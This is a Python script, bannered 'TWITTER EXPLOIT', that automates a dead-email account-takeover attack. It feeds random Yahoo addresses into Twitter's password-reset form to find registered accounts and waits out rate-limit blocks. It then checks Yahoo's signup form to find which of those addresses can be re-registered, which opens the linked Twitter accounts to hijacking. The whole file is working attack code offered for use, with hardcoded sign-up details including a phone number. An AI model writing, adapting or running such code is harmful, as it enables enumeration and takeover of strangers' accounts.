import mechanize
from bs4 import BeautifulSoup
from faker import Faker
import sys
from time import sleep
import geocoder

class twitter:
	def __init__(self):
		self.br=mechanize.Browser()
		self.br.set_handle_referer(True)
		self.br.set_handle_refresh(False)
		self.br.set_handle_robots(False)
		self.br.set_debug_redirects(True)
		self.br.set_handle_equiv(False)
		self.br.set_handle_redirect(True)
		self.ip=geocoder.ip('me')

	def countdown(self):
		t=3600
		while t:
			mins, secs = divmod(t, 60)
			timeformat = '{:02d}:{:02d}'.format(mins, secs)
			print("\rIP kamu terdetect! coba lagi dalam",timeformat, end='\r')
			sleep(1)
			t -= 1

	def check_email(self):
		print("IP saya:",self.ip.ip)
		print("City:",self.ip.city)
		jumlah=int(input("\nJumlah target? "))
		for x in range(jumlah):
			email=Faker()
			mails=email.email()
			if "@yahoo.com" in mails:
				self.br.open("https://twitter.com/account/begin_password_reset?lang=id")
				self.br.select_form(nr=0)
				self.br.form["account_identifier"]=mails
				self.br.method="POST"
				f=open("emails.txt","a")
				soup=BeautifulSoup(self.br.submit().read(), features="html.parser")
				try:
					tok=[".    ","..   ","...  "]
					for x in tok:
						print("\rSedang mencari target",x,end="",flush=True)
						sleep(0.3)
					find=soup.find("div", class_="PageHeader is-errored").get_text()
					if find==find:
						pass
					if find=="Silakan coba lagi nanti.":
						print("")
						try:
							self.countdown()
						except KeyboardInterrupt:
							os.system("reset")
							os.system("clear")
							os.system("python twitter.py")
				except AttributeError as err:
					repl=mails.replace("@yahoo.com","")
					f.write(repl + "\n")
				f.close()

	def check_valid_emails(self):
		f=open("emails.txt","r").readlines()

		print("\nTotal target email yang ditemukan:",len(f))
		if len(f)==0:
			sys.exit("Tidak ada target ditemukan!")
		print("")
		for emails in f:
			emails=emails.replace("\n","")
			self.br.open("https://login.yahoo.com/account/create?.intl=my&.lang=en-MY&.done=https%3A%2F%2Fmalaysia.yahoo.com&src=fpctx&specId=yidReg")
			self.br.select_form(nr=0)
			self.br.form["firstName"]="khazull"
			self.br.form["lastName"]="shadiq"
			self.br.form["yid"]=emails
			self.br.form["password"]="diki0821"
			self.br.form["shortCountryCode"]=["MY"]
			self.br.form["phone"]="01139901580"
			self.br.form["mm"]=["11"]
			self.br.form["dd"]="04"
			self.br.form["yyyy"]="1999"
			self.br.form["freeformGender"]="laki-laki"
			self.br.method="POST"
			res=self.br.submit().read()
			file=open("valid.txt","a")
			if b"messages.IDENTIFIER_EXISTS" in res:
				print(emails+"@yahoo.com => invalid")

			else:
				print(emails + "@yahoo.com  => valid")
				file.write(emails+"@yahoo.com\n")
			file.close()
		fo=open("valid.txt","r").readlines()
		print("Total email valid:",len(fo))

if __name__=="__main__":
	import os, sys
	from time import sleep
	os.system("clear")
	print("""
		╔═════════════════╗
		  TWITTER EXPLOIT
		╚═════════════════╝
		    LEARN CODE\n""")
	main=twitter()
	main.check_email()

	main.check_valid_emails()
	os.system("rm -rf emails.txt")

